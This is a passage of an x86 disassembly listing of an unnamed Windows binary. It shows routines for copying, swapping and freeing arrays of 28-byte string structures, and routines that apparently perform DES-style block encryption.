                add     esp, 8
                pop     edi

loc_40B262:                             ; CODE XREF: sub_40B240+6↑j
                mov     eax, [esi]
                push    eax
                mov     dword ptr [esi+0Ch], 0
                mov     dword ptr [esi+10h], 0
                mov     dword ptr [esi+14h], 0
                call    sub_40F15B
                add     esp, 8
                retn
sub_40B240      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40B290      proc near               ; CODE XREF: sub_4099D0+2B5↑p
                                        ; sub_4099D0+339↑p

var_8           = byte ptr -8
arg_0           = dword ptr  4

                sub     esp, 8
                push    ebx
                push    ebp
                mov     ebp, [esp+10h+arg_0]
                mov     ebx, eax
                push    esi
                push    edi
                cmp     ebp, ebx
                jz      loc_40B44B
                mov     eax, [ebx+0Ch]
                mov     ecx, [ebx+10h]
                sub     ecx, eax
                mov     eax, 92492493h
                imul    ecx
                add     edx, ecx
                sar     edx, 4
                mov     edi, edx
                shr     edi, 1Fh
                add     edi, edx
                jnz     short loc_40B2FD
                mov     ebx, [ebp+10h]
                cmp     [ebp+0Ch], ebx
                jbe     short loc_40B2CF
                call    sub_40EC7A

loc_40B2CF:                             ; CODE XREF: sub_40B290+38↑j
                mov     esi, [ebp+0Ch]
                mov     edi, [ebp+0]
                cmp     esi, [ebp+10h]
                jbe     short loc_40B2DF
                call    sub_40EC7A

loc_40B2DF:                             ; CODE XREF: sub_40B290+48↑j
                mov     eax, [ebp+0]
                push    ebx
                push    edi
                push    esi
                push    eax
                lea     ebx, [esp+28h+var_8]
                mov     esi, ebp
                call    sub_40B460
                mov     eax, ebp
                pop     edi
                pop     esi
                pop     ebp
                pop     ebx
                add     esp, 8
                retn    4
; ---------------------------------------------------------------------------

loc_40B2FD:                             ; CODE XREF: sub_40B290+30↑j
                mov     ecx, [ebp+10h]
                mov     esi, [ebp+0Ch]
                sub     ecx, esi
                mov     eax, 92492493h
                imul    ecx
                add     edx, ecx
                sar     edx, 4
                mov     ecx, edx
                shr     ecx, 1Fh
                add     ecx, edx
                cmp     edi, ecx
                ja      short loc_40B370
                mov     edi, [ebx+10h]
                mov     ecx, [ebx+0Ch]
                mov     eax, esi
                call    sub_40B880
                mov     ecx, [esp+18h+arg_0]
                mov     edi, [ebp+10h]
                push    ecx
                call    sub_40B200
                mov     ecx, [ebx+10h]
                sub     ecx, [ebx+0Ch]
                mov     eax, 92492493h
                imul    ecx
                add     edx, ecx
                sar     edx, 4
                mov     eax, edx
                shr     eax, 1Fh
                add     eax, edx
                lea     edx, ds:0[eax*8]
                add     esp, 4
                sub     edx, eax
                mov     eax, [ebp+0Ch]
                lea     ecx, [eax+edx*4]
                mov     [ebp+10h], ecx
                mov     eax, ebp
                pop     edi
                pop     esi
                pop     ebp
                pop     ebx
                add     esp, 8
                retn    4
; ---------------------------------------------------------------------------

loc_40B370:                             ; CODE XREF: sub_40B290+8A↑j
                test    esi, esi
                jnz     short loc_40B378
                xor     eax, eax
                jmp     short loc_40B396
; ---------------------------------------------------------------------------

loc_40B378:                             ; CODE XREF: sub_40B290+E2↑j
                mov     edx, [ebp+14h]
                sub     edx, esi
                mov     [esp+18h+arg_0], edx
                mov     eax, 92492493h
                imul    edx
                add     edx, [esp+18h+arg_0]
                sar     edx, 4
                mov     eax, edx
                shr     eax, 1Fh
                add     eax, edx

loc_40B396:                             ; CODE XREF: sub_40B290+E6↑j
                cmp     edi, eax
                ja      short loc_40B3E2
                mov     edx, [ebx+0Ch]
                lea     eax, ds:0[ecx*8]
                sub     eax, ecx
                lea     edi, [edx+eax*4]
                mov     eax, esi
                mov     ecx, edx
                call    sub_40B880
                mov     eax, [ebp+10h]
                mov     ebx, [ebx+10h]
                mov     byte ptr [esp+18h+arg_0], 0
                mov     ecx, [esp+18h+arg_0]
                mov     edx, [esp+18h+arg_0]
                push    ecx
                push    edx
                push    eax
                push    ebx
                mov     ecx, edi
                call    sub_40B4E0
                mov     [ebp+10h], eax
                add     esp, 10h
                mov     eax, ebp
                pop     edi
                pop     esi
                pop     ebp
                pop     ebx
                add     esp, 8
                retn    4
; ---------------------------------------------------------------------------

loc_40B3E2:                             ; CODE XREF: sub_40B290+108↑j
                test    esi, esi
                jz      short loc_40B404
                mov     eax, [esp+18h+arg_0]
                mov     edi, [ebp+10h]
                push    eax
                mov     eax, esi
                call    sub_40B200
                mov     ecx, [ebp+0Ch]
                add     esp, 4
                push    ecx
                call    sub_40F15B
                add     esp, 4

loc_40B404:                             ; CODE XREF: sub_40B290+154↑j
                mov     ecx, [ebx+10h]
                sub     ecx, [ebx+0Ch]
                mov     eax, 92492493h
                imul    ecx
                add     edx, ecx
                sar     edx, 4
                mov     esi, edx
                mov     eax, 0
                shr     esi, 1Fh
                add     esi, edx
                mov     [ebp+0Ch], eax
                mov     [ebp+10h], eax
                mov     [ebp+14h], eax
                jz      short loc_40B44B
                mov     edi, ebp
                call    sub_409180
                test    al, al
                jz      short loc_40B44B
                mov     edx, [ebx+10h]
                mov     eax, [ebx+0Ch]
                push    edx
                mov     edx, [ebp+0Ch]
                push    eax
                call    sub_40B8D0
                mov     [ebp+10h], eax

loc_40B44B:                             ; CODE XREF: sub_40B290+F↑j
                                        ; sub_40B290+19B↑j ...
                pop     edi
                pop     esi
                mov     eax, ebp
                pop     ebp
                pop     ebx
                add     esp, 8
                retn    4
sub_40B290      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40B460      proc near               ; CODE XREF: sub_40B290+5C↑p

arg_0           = dword ptr  4
arg_4           = dword ptr  8
arg_C           = dword ptr  10h

                push    ebp
                push    edi
                mov     dword ptr [ebx], 0
                test    esi, esi
                jz      short loc_40B47A
                mov     eax, [esp+8+arg_4]
                cmp     [esi+0Ch], eax
                ja      short loc_40B47A
                cmp     eax, [esi+10h]
                jbe     short loc_40B483

loc_40B47A:                             ; CODE XREF: sub_40B460+A↑j
                                        ; sub_40B460+13↑j
                call    sub_40EC7A
                mov     eax, [esp+8+arg_4]

loc_40B483:                             ; CODE XREF: sub_40B460+18↑j
                mov     ebp, [esp+8+arg_C]
                mov     ecx, [esi]
                mov     [ebx], ecx
                mov     [ebx+4], eax
                cmp     [esi+0Ch], ebp
                ja      short loc_40B498
                cmp     ebp, [esi+10h]
                jbe     short loc_40B4A1

loc_40B498:                             ; CODE XREF: sub_40B460+31↑j
                call    sub_40EC7A
                mov     ebp, [esp+8+arg_C]

loc_40B4A1:                             ; CODE XREF: sub_40B460+36↑j
                mov     eax, [ebx]
                mov     ecx, [esi]
                test    eax, eax
                jz      short loc_40B4AD
                cmp     eax, ecx
                jz      short loc_40B4B2

loc_40B4AD:                             ; CODE XREF: sub_40B460+47↑j
                call    sub_40EC7A

loc_40B4B2:                             ; CODE XREF: sub_40B460+4B↑j
                mov     eax, [ebx+4]
                cmp     eax, ebp
                jz      short loc_40B4D8
                mov     edi, [esi+10h]
                mov     ecx, ebp
                call    sub_40B880
                mov     edx, [esp+8+arg_0]
                mov     edi, [esi+10h]
                push    edx
                mov     ebp, eax
                call    sub_40B200
                add     esp, 4
                mov     [esi+10h], ebp

loc_40B4D8:                             ; CODE XREF: sub_40B460+57↑j
                pop     edi
                mov     eax, ebx
                pop     ebp
                retn    10h
sub_40B460      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40B4E0      proc near               ; CODE XREF: sub_408740+D6↑p
                                        ; sub_40B290+13B↑p ...

var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                push    ebp
                mov     ebp, esp
                push    0FFFFFFFFh
                push    offset SEH_40B4E0
                mov     eax, large fs:0
                push    eax
                sub     esp, 8
                push    ebx
                push    esi
                push    edi
                mov     eax, ___security_cookie
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_C]
                mov     large fs:0, eax
                mov     [ebp+var_10], esp
                mov     esi, [ebp+arg_4]
                mov     edi, ecx
                xor     ebx, ebx
                mov     [ebp+var_14], esi
                mov     [ebp+var_4], ebx

loc_40B518:                             ; CODE XREF: sub_40B4E0+69↓j
                cmp     edi, [ebp+arg_0]
                jz      short loc_40B56A
                mov     byte ptr [ebp+var_4], 1
                cmp     esi, ebx
                jz      short loc_40B53D
                push    0FFFFFFFFh
                push    ebx
                mov     dword ptr [esi+18h], 0Fh
                mov     [esi+14h], ebx
                push    edi
                mov     ecx, esi
                mov     [esi+4], bl
                call    sub_408CA0

loc_40B53D:                             ; CODE XREF: sub_40B4E0+43↑j
                add     esi, 1Ch
                mov     byte ptr [ebp+var_4], bl
                mov     [ebp+arg_4], esi
                add     edi, 1Ch
                jmp     short loc_40B518
; ---------------------------------------------------------------------------

loc_40B54B:                             ; DATA XREF: .rdata:stru_423638↓o
                mov     esi, [ebp+var_14]
                mov     edi, [ebp+arg_4]
                cmp     esi, edi
                jz      short loc_40B561

loc_40B555:                             ; CODE XREF: sub_40B4E0+7F↓j
                call    sub_40A000
                add     esi, 1Ch
                cmp     esi, edi
                jnz     short loc_40B555

loc_40B561:                             ; CODE XREF: sub_40B4E0+73↑j
                xor     ebx, ebx
                push    ebx
                push    ebx
                call    sub_41032B

loc_40B56A:                             ; CODE XREF: sub_40B4E0+3B↑j
                mov     eax, esi
                mov     ecx, [ebp+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
sub_40B4E0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40B580      proc near               ; CODE XREF: sub_4099D0+115↑p
                                        ; sub_4099D0+141↑p ...

var_2C          = dword ptr -2Ch
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                push    ebp
                mov     ebp, esp
                push    0FFFFFFFFh
                push    offset SEH_40B580
                mov     eax, large fs:0
                push    eax
                sub     esp, 24h
                push    ebx
                push    esi
                push    edi
                mov     eax, ___security_cookie
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_C]
                mov     large fs:0, eax
                mov     [ebp+var_10], esp
                mov     edi, [ebp+arg_4]
                mov     esi, ecx
                push    4
                mov     [ebp+var_14], edi
                call    sub_40F94F
                xor     ecx, ecx
                add     esp, 4
                cmp     eax, ecx
                jz      short loc_40B5CA
                lea     edx, [ebp+var_2C]
                mov     [eax], edx
                jmp     short loc_40B5CC
; ---------------------------------------------------------------------------

loc_40B5CA:                             ; CODE XREF: sub_40B580+41↑j
                xor     eax, eax

loc_40B5CC:                             ; CODE XREF: sub_40B580+48↑j
                mov     [ebp+var_2C], eax
                xor     eax, eax
                mov     [ebp+var_20], eax
                mov     [ebp+var_1C], ecx
                mov     [ebp+var_18], ecx
                mov     bl, 2
                mov     [ebp+var_4], 1
                mov     byte ptr [ebp+var_4], bl

loc_40B5E6:                             ; CODE XREF: sub_40B580+95↓j
                cmp     esi, [ebp+arg_0]
                jz      short loc_40B636
                mov     byte ptr [ebp+var_4], 3
                cmp     edi, ecx
                jz      short loc_40B5FC
                push    edi
                lea     ecx, [ebp+var_2C]
                call    sub_408740

loc_40B5FC:                             ; CODE XREF: sub_40B580+71↑j
                push    edi
                mov     edx, esi
                mov     byte ptr [ebp+var_4], bl
                call    sub_40B900
                mov     eax, [ebp+var_20]
                add     edi, 18h
                add     esi, 18h
                mov     [ebp+arg_4], edi
                xor     ecx, ecx
                jmp     short loc_40B5E6
; ---------------------------------------------------------------------------

loc_40B617:                             ; DATA XREF: .rdata:stru_423E94↓o
                mov     esi, [ebp+var_14]
                mov     edi, [ebp+arg_4]
                cmp     esi, edi
                jz      short loc_40B62D

loc_40B621:                             ; CODE XREF: sub_40B580+AB↓j
                call    sub_40B240
                add     esi, 18h
                cmp     esi, edi
                jnz     short loc_40B621

loc_40B62D:                             ; CODE XREF: sub_40B580+9F↑j
                push    0
                push    0
                call    sub_41032B

loc_40B636:                             ; CODE XREF: sub_40B580+69↑j
                cmp     eax, ecx
                jz      short loc_40B67C
                mov     ebx, [ebp+var_1C]
                cmp     eax, ebx
                jz      short loc_40B671
                lea     esi, [eax+18h]

loc_40B644:                             ; CODE XREF: sub_40B580+EC↓j
                cmp     dword ptr [esi], 10h
                jb      short loc_40B657
                mov     eax, [esi-14h]
                push    eax
                call    sub_40F15B
                add     esp, 4
                xor     ecx, ecx

loc_40B657:                             ; CODE XREF: sub_40B580+C7↑j
                mov     dword ptr [esi], 0Fh
                mov     [esi-4], ecx
                mov     byte ptr [esi-14h], 0
                add     esi, 1Ch
                lea     edx, [esi-18h]
                cmp     edx, ebx
                jnz     short loc_40B644
                mov     eax, [ebp+var_20]

loc_40B671:                             ; CODE XREF: sub_40B580+BF↑j
                push    eax
                call    sub_40F15B
                add     esp, 4
                xor     ecx, ecx

loc_40B67C:                             ; CODE XREF: sub_40B580+B8↑j
                mov     eax, [ebp+var_2C]
                push    eax
                mov     [ebp+var_20], ecx
                mov     [ebp+var_1C], ecx
                mov     [ebp+var_18], ecx
                call    sub_40F15B
                add     esp, 4
                mov     eax, edi
                mov     ecx, [ebp+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
sub_40B580      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40B6B0      proc near               ; CODE XREF: sub_40A030+123↑p
                                        ; sub_40A030+155↑p ...

var_48          = dword ptr -48h
var_44          = dword ptr -44h
var_34          = dword ptr -34h
var_30          = byte ptr -30h
var_2C          = dword ptr -2Ch
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4
arg_0           = dword ptr  8

                push    ebp
                mov     ebp, esp
                push    0FFFFFFFFh
                push    offset SEH_40B6B0
                mov     eax, large fs:0
                push    eax
                sub     esp, 3Ch
                mov     eax, ___security_cookie
                xor     eax, ebp
                mov     [ebp+var_14], eax
                push    ebx
                push    esi
                push    edi
                push    eax
                lea     eax, [ebp+var_C]
                mov     large fs:0, eax
                mov     [ebp+var_10], esp
                mov     esi, edx
                xor     ebx, ebx
                mov     edi, ecx
                mov     [ebp+var_44], esi
                mov     [ebp+var_48], esi
                mov     [ebp+var_18], 0Fh
                mov     [ebp+var_1C], ebx
                mov     byte ptr [ebp+var_2C], bl
                mov     [ebp+var_4], ebx
                mov     byte ptr [ebp+var_4], 1
                mov     edi, edi

loc_40B700:                             ; CODE XREF: sub_40B6B0+DD↓j
                cmp     edi, [ebp+arg_0]
                jz      loc_40B7B5
                mov     byte ptr [ebp+var_4], 2
                cmp     esi, ebx
                jz      short loc_40B72C
                push    0FFFFFFFFh
                push    ebx
                lea     eax, [ebp+var_30]
                mov     dword ptr [esi+18h], 0Fh
                mov     [esi+14h], ebx
                push    eax
                mov     ecx, esi
                mov     [esi+4], bl
                call    sub_408CA0

loc_40B72C:                             ; CODE XREF: sub_40B6B0+5F↑j
                mov     byte ptr [ebp+var_4], 1
                cmp     esi, edi
                jz      short loc_40B784
                mov     ebx, [esi+10h]
                mov     eax, [esi+4]
                mov     ecx, [esi+8]
                mov     edx, [esi+0Ch]
                mov     [ebp+var_34], ebx
                mov     ebx, [edi+4]
                mov     [esi+4], ebx
                mov     ebx, [edi+8]
                mov     [esi+8], ebx
                mov     ebx, [edi+0Ch]
                mov     [esi+0Ch], ebx
                mov     ebx, [edi+10h]
                mov     [esi+10h], ebx
                mov     [edi+4], eax
                mov     [edi+8], ecx
                mov     ecx, [ebp+var_34]
                mov     [edi+0Ch], edx
                mov     edx, [edi+14h]
                mov     [edi+10h], ecx
                mov     eax, [esi+14h]
                mov     [esi+14h], edx
                mov     ecx, [edi+18h]
                mov     [edi+14h], eax
                mov     eax, [esi+18h]
                mov     [esi+18h], ecx
                mov     [edi+18h], eax
                xor     ebx, ebx

loc_40B784:                             ; CODE XREF: sub_40B6B0+82↑j
                add     esi, 1Ch
                mov     [ebp+var_44], esi
                add     edi, 1Ch
                jmp     loc_40B700
; ---------------------------------------------------------------------------

loc_40B792:                             ; DATA XREF: .rdata:stru_4235D8↓o
                mov     esi, [ebp+var_48]
                mov     edi, [ebp+var_44]
                cmp     esi, edi
                jz      short loc_40B7AC
                lea     esp, [esp+0]

loc_40B7A0:                             ; CODE XREF: sub_40B6B0+FA↓j
                call    sub_40A000
                add     esi, 1Ch
                cmp     esi, edi
                jnz     short loc_40B7A0

loc_40B7AC:                             ; CODE XREF: sub_40B6B0+EA↑j
                push    0
                push    0
                call    sub_41032B

loc_40B7B5:                             ; CODE XREF: sub_40B6B0+53↑j
                cmp     [ebp+var_18], 10h
                jb      short loc_40B7C7
                mov     edx, [ebp+var_2C]
                push    edx
                call    sub_40F15B
                add     esp, 4

loc_40B7C7:                             ; CODE XREF: sub_40B6B0+109↑j
                mov     eax, esi
                mov     ecx, [ebp+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     ecx, [ebp+var_14]
                xor     ecx, ebp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     esp, ebp
                pop     ebp
                retn
sub_40B6B0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40B7F0      proc near               ; CODE XREF: sub_40AFE0+1C↑p

var_4           = dword ptr -4
arg_0           = dword ptr  4
arg_4           = dword ptr  8

                push    ecx
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+4+var_4], eax
                mov     eax, [esp+4+arg_4]
                cmp     [esp+4+arg_0], ecx
                jz      short loc_40B86C
                push    ebx
                push    ebp
                push    esi
                push    edi
                lea     esp, [esp+0]

loc_40B810:                             ; CODE XREF: sub_40B7F0+76↓j
                sub     ecx, 1Ch
                sub     eax, 1Ch
                cmp     eax, ecx
                jz      short loc_40B862
                mov     ebp, [ecx+4]
                mov     edx, [eax+4]
                mov     esi, [eax+8]
                mov     edi, [eax+0Ch]
                mov     ebx, [eax+10h]
                mov     [eax+4], ebp
                mov     ebp, [ecx+8]
                mov     [eax+8], ebp
                mov     ebp, [ecx+0Ch]
                mov     [eax+0Ch], ebp
                mov     ebp, [ecx+10h]
                mov     [eax+10h], ebp
                mov     [ecx+4], edx
                mov     [ecx+8], esi
                mov     esi, [ecx+14h]
                mov     [ecx+0Ch], edi
                mov     [ecx+10h], ebx
                mov     edx, [eax+14h]
                mov     [eax+14h], esi
                mov     esi, [ecx+18h]
                mov     [ecx+14h], edx
                mov     edx, [eax+18h]
                mov     [eax+18h], esi
                mov     [ecx+18h], edx

loc_40B862:                             ; CODE XREF: sub_40B7F0+28↑j
                cmp     ecx, [esp+14h+arg_0]
                jnz     short loc_40B810
                pop     edi
                pop     esi
                pop     ebp
                pop     ebx

loc_40B86C:                             ; CODE XREF: sub_40B7F0+13↑j
                mov     ecx, [esp+4+var_4]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                pop     ecx
                retn
sub_40B7F0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40B880      proc near               ; CODE XREF: sub_40B290+94↑p
                                        ; sub_40B290+11D↑p ...
                push    ebx
                push    ebp
                mov     ebx, eax
                push    esi
                mov     esi, ecx
                mov     ecx, edi
                sub     ecx, esi
                mov     eax, 92492493h
                imul    ecx
                add     edx, ecx
                sar     edx, 4
                mov     eax, edx
                shr     eax, 1Fh
                add     eax, edx
                lea     ecx, ds:0[eax*8]
                sub     ecx, eax
                lea     ebp, [ebx+ecx*4]
                cmp     esi, edi
                jz      short loc_40B8C4
                sub     ebx, esi

loc_40B8B0:                             ; CODE XREF: sub_40B880+42↓j
                push    0FFFFFFFFh
                push    0
                push    esi
                lea     ecx, [ebx+esi]
                call    sub_408CA0
                add     esi, 1Ch
                cmp     esi, edi
                jnz     short loc_40B8B0

loc_40B8C4:                             ; CODE XREF: sub_40B880+2C↑j
                pop     esi
                mov     eax, ebp
                pop     ebp
                pop     ebx
                retn
sub_40B880      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40B8D0      proc near               ; CODE XREF: sub_40B290+1B3↑p

var_4           = dword ptr -4
arg_0           = dword ptr  4
arg_4           = dword ptr  8

                push    ecx
                mov     ecx, [esp+4+arg_4]
                mov     byte ptr [esp+4+var_4], 0
                mov     eax, [esp+4+var_4]
                push    eax
                mov     eax, [esp+8+arg_4]
                push    ecx
                mov     ecx, [esp+0Ch+arg_0]
                push    edx
                push    eax
                call    sub_40B4E0
                add     esp, 14h
                retn    8
sub_40B8D0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40B900      proc near               ; CODE XREF: sub_40AF70+3B↑p
                                        ; sub_40B580+82↑p

var_C           = dword ptr -0Ch
arg_0           = dword ptr  4

                push    0FFFFFFFFh
                push    offset SEH_40B900
                mov     eax, large fs:0
                push    eax
                push    ecx
                push    ebx
                push    esi
                push    edi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+20h+var_C]
                mov     large fs:0, eax
                mov     eax, [esp+20h+arg_0]
                cmp     eax, edx
                jz      short loc_40B978
                mov     esi, [edx]
                mov     ecx, [eax]
                mov     [eax], esi
                mov     [edx], ecx
                mov     esi, [eax]
                cmp     esi, ecx
                jz      short loc_40B942
                mov     ebx, [ecx]
                mov     edi, [esi]
                mov     [esi], ebx
                mov     [ecx], edi

loc_40B942:                             ; CODE XREF: sub_40B900+38↑j
                lea     ecx, [edx+0Ch]
                lea     esi, [eax+0Ch]
                cmp     esi, ecx
                jz      short loc_40B954
                mov     ebx, [ecx]
                mov     edi, [esi]
                mov     [esi], ebx
                mov     [ecx], edi

loc_40B954:                             ; CODE XREF: sub_40B900+4A↑j
                lea     ecx, [edx+10h]
                lea     esi, [eax+10h]
                cmp     esi, ecx
                jz      short loc_40B966
                mov     ebx, [ecx]
                mov     edi, [esi]
                mov     [esi], ebx
                mov     [ecx], edi

loc_40B966:                             ; CODE XREF: sub_40B900+5C↑j
                lea     ecx, [edx+14h]
                add     eax, 14h
                cmp     eax, ecx
                jz      short loc_40B978
                mov     esi, [ecx]
                mov     edx, [eax]
                mov     [eax], esi
                mov     [ecx], edx

loc_40B978:                             ; CODE XREF: sub_40B900+2A↑j
                                        ; sub_40B900+6E↑j
                mov     ecx, [esp+20h+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                add     esp, 10h
                retn    4
sub_40B900      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40B990      proc near               ; CODE XREF: sub_40C190+1BC↓p

arg_0           = dword ptr  4
arg_4           = dword ptr  8

                push    ebp
                mov     ebp, [esp+4+arg_0]
                push    esi
                mov     esi, ecx
                test    esi, esi
                jz      loc_40BA4E
                test    ebp, ebp
                jz      loc_40BA4E
                test    eax, eax
                jz      loc_40BA4E
                mov     ecx, [esp+8+arg_4]
                add     ecx, 7
                and     ecx, 0FFFFFFF8h
                mov     [esp+8+arg_4], ecx
                jz      loc_40BA4E
                push    ebx
                push    eax
                mov     ebx, edx
                mov     eax, edi
                call    sub_40BA60
                cmp     byte ptr [edi+600h], 0
                jnz     short loc_40BA05
                mov     eax, [esp+0Ch+arg_4]
                sar     eax, 3
                test    eax, eax
                jle     short loc_40BA46
                mov     ebx, eax

loc_40B9E5:                             ; CODE XREF: sub_40B990+6B↓j
                push    1
                push    esi
                push    edi
                mov     eax, edi
                mov     ecx, ebp
                call    sub_40BAD0
                add     esi, 8
                add     ebp, 8
                sub     ebx, 1
                jnz     short loc_40B9E5
                pop     ebx
                pop     esi
                mov     al, 1
                pop     ebp
                retn    8
; ---------------------------------------------------------------------------

loc_40BA05:                             ; CODE XREF: sub_40B990+46↑j
                mov     ebx, [esp+0Ch+arg_4]
                sar     ebx, 3
                test    ebx, ebx
                jle     short loc_40BA46

loc_40BA10:                             ; CODE XREF: sub_40B990+B4↓j
                push    1
                push    esi
                push    edi
                mov     eax, edi
                mov     ecx, ebp
                call    sub_40BAD0
                push    0
                push    esi
                push    edi
                lea     eax, [edi+300h]
                mov     ecx, esi
                call    sub_40BAD0
                push    1
                push    esi
                push    edi
                mov     eax, edi
                mov     ecx, esi
                call    sub_40BAD0
                add     esi, 8
                add     ebp, 8
                sub     ebx, 1
                jnz     short loc_40BA10

loc_40BA46:                             ; CODE XREF: sub_40B990+51↑j
                                        ; sub_40B990+7E↑j
                pop     ebx
                pop     esi
                mov     al, 1
                pop     ebp
                retn    8
; ---------------------------------------------------------------------------

loc_40BA4E:                             ; CODE XREF: sub_40B990+A↑j
                                        ; sub_40B990+12↑j ...
                pop     esi
                xor     al, al
                pop     ebp
                retn    8
sub_40B990      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40BA60      proc near               ; CODE XREF: sub_40B990+3A↑p

arg_0           = dword ptr  4

                push    esi
                push    edi
                mov     edi, eax
                xor     eax, eax
                cmp     ebx, 10h
                lea     esi, [edi+701h]
                mov     [esi], eax
                mov     [esi+4], eax
                mov     [esi+8], eax
                mov     [esi+0Ch], eax
                mov     eax, 10h
                jg      short loc_40BA83
                mov     eax, ebx

loc_40BA83:                             ; CODE XREF: sub_40BA60+1F↑j
                push    eax
                mov     eax, [esp+0Ch+arg_0]
                push    eax
                push    esi
                call    sub_414550
                add     esp, 0Ch
                push    edi
                mov     eax, esi
                call    sub_40BD30
                cmp     ebx, 8
                jle     short loc_40BABE
                lea     ecx, [edi+300h]
                lea     eax, [edi+709h]
                push    ecx
                call    sub_40BD30
                mov     al, 1
                mov     [edi+600h], al
                pop     edi
                pop     esi
                retn    4
; ---------------------------------------------------------------------------

loc_40BABE:                             ; CODE XREF: sub_40BA60+3D↑j
                xor     al, al
                mov     [edi+600h], al
                pop     edi
                pop     esi
                retn    4
sub_40BA60      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40BAD0      proc near               ; CODE XREF: sub_40B990+5D↑p
                                        ; sub_40B990+88↑p ...

arg_0           = dword ptr  4
arg_4           = dword ptr  8
arg_8           = dword ptr  0Ch

                push    ebp
                mov     ebp, [esp+4+arg_0]
                push    esi
                push    edi
                mov     edi, eax
                mov     esi, ecx
                xor     eax, eax
                lea     ecx, [ecx+0]

loc_40BAE0:                             ; CODE XREF: sub_40BAD0+2C↓j
                mov     edx, eax
                sar     edx, 3
                mov     dl, [edx+esi]
                mov     cl, al
                and     cl, 7
                sar     dl, cl
                inc     eax
                and     dl, 1
                cmp     eax, 40h
                mov     byte_42C93F[eax], dl
                jl      short loc_40BAE0
                xor     eax, eax

loc_40BB00:                             ; CODE XREF: sub_40BAD0+8A↓j
                movsx   ecx, ds:byte_421D48[eax]
                movzx   edx, byte_42C93F[ecx]
                mov     [eax+ebp+601h], dl
                movsx   ecx, ds:byte_421D49[eax]
                movzx   edx, byte_42C93F[ecx]
                mov     [eax+ebp+602h], dl
                movsx   ecx, ds:byte_421D4A[eax]
                movzx   edx, byte_42C93F[ecx]
                mov     [eax+ebp+603h], dl
                movsx   ecx, ds:byte_421D4B[eax]
                movzx   edx, byte_42C93F[ecx]
                mov     [eax+ebp+604h], dl
                add     eax, 4
                cmp     eax, 40h
                jl      short loc_40BB00
                push    ebx
                lea     eax, [ebp+601h]
                push    40h
                push    eax
                push    offset byte_42C940
                mov     [esp+1Ch+arg_0], eax
                call    sub_414550
                add     esp, 0Ch
                cmp     byte ptr [esp+10h+arg_8], 0
                jnz     loc_40BC0C
                mov     ebx, edi
                mov     [esp+10h+arg_8], 10h
                lea     esp, [esp+0]

loc_40BB90:                             ; CODE XREF: sub_40BAD0+135↓j
                mov     ecx, 8
                mov     esi, offset byte_42C960
                mov     edi, offset unk_42C9B0
                rep movsd
                mov     edi, offset byte_42C960
                mov     esi, ebp
                call    sub_40BF20
                xor     eax, eax
                nop

loc_40BBB0:                             ; CODE XREF: sub_40BAD0+11A↓j
                movzx   ecx, byte_42C940[eax]
                movzx   edx, byte_42C941[eax]
                xor     byte_42C960[eax], cl
                xor     byte_42C961[eax], dl
                movzx   ecx, byte_42C942[eax]
                movzx   edx, byte_42C943[eax]
                xor     byte_42C962[eax], cl
                xor     byte_42C963[eax], dl
                add     eax, 4
                cmp     eax, 20h
                jl      short loc_40BBB0
                mov     ecx, 8
                mov     esi, offset unk_42C9B0
                mov     edi, offset byte_42C940
                add     ebx, 30h
                sub     [esp+10h+arg_8], 1
                rep movsd
                jnz     short loc_40BB90
                jmp     loc_40BC9D
; ---------------------------------------------------------------------------

loc_40BC0C:                             ; CODE XREF: sub_40BAD0+AC↑j
                mov     [esp+10h+arg_8], 0Fh
                lea     ebx, [edi+2D0h]
                lea     ebx, [ebx+0]

loc_40BC20:                             ; CODE XREF: sub_40BAD0+1CB↓j
                mov     ecx, 8
                mov     esi, offset byte_42C940
                mov     edi, offset unk_42C9B0
                rep movsd
                mov     edi, offset byte_42C940
                mov     esi, ebp
                call    sub_40BF20
                xor     eax, eax
                nop

loc_40BC40:                             ; CODE XREF: sub_40BAD0+1AA↓j
                movzx   ecx, byte_42C960[eax]
                movzx   edx, byte_42C961[eax]
                xor     byte_42C940[eax], cl
                xor     byte_42C941[eax], dl
                movzx   ecx, byte_42C962[eax]
